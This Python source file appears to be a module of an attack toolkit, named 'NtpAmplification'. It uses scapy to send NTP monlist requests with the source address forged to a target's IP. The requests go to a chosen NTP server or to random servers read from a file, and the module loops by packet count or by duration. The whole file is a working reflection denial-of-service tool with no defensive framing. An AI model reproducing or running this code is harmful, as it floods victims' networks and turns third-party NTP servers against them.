from scapy.all import *

from lib.cmd_tool import *

NAME = 'NtpAmplification'

class Module:
    def __init__(self):
        self.config = {
            'IP': {
                'value': '',
                'help': 'Target IPv4 address.',
            },
            'Ports': {

            },
            'NtpHost': {
                'value': '',
                'help': '',
            },
            'NtpHostFile': {
                'value': '',
                'help': '',
            },
            'Count': {
                'value': '',
                'help': '',
            },
            'Time': {
                'value': '',
                'help': '',
            },
            'Mode': {
                'value': '',
                'help': '',
                'option': {
                    MODE_COUNT: '',
                    MODE_TIME: '',
                }
            },
        }

    def interactive(self):
        interactive(self, 'ntp_amp')

    def get_ntp_host(self) -> str:
        szNtpHost = get_value(self.config, 'NtpHost')
        szNtpHostFile = get_value(self.config, 'NtpHostFile')

        if szNtpHostFile:
            if os.path.exists(szNtpHostFile):
                with open(szNtpHostFile, 'r') as f:
                    lsHost = f.readlines()
                    return lsHost[randint(0, len(lsHost))]

        elif szNtpHost:
            return szNtpHost

        cp.pf_failed('NTP host is null or empty.')
        return None
    
    def run(self):
        def ntp_req(szIP: str, szNtpHost: str):
            szNtpIP, szNtpPort = szNtpHost.split(':')
            nNtpPort = int(szNtpPort)

            pktIP = IP(src=szIP, dst=szNtpIP)
            pktUDP = UDP(sport=randInt(), dport=nNtpPort)
            pktRAW = Raw(load="\x17\x00\x03\x2a" + "\x00" * 12)

            pkt = pktIP / pktUDP / pktRAW

            send(pkt, verbose=False)

        try:
            lsIP = str2strls(get_value(self.config, 'IP'))
            nCnt = int(get_value(self.config, 'Count'))
            nTime = int(get_value(self.config, 'Time'))
            nMode = int(get_value(self.config, 'Mode'))

            total = 0

            for ip in lsIP:
                if nMode == MODE_COUNT:
                    for _ in range(0, nCnt):
                        ntp_req(ip, self.get_ntp_host())
                        total += 1
                elif nMode == MODE_TIME:
                    params = {
                        'szIP': ip,
                        'szNtpHost': self.get_ntp_host(),
                    }

                    total += doWorkWithSeconds(ntp_req, nTime, params)
            
            cp.pf_ok(f'Done, total={total}')

        except Exception as ex:
            cp.pf_failed(str(ex))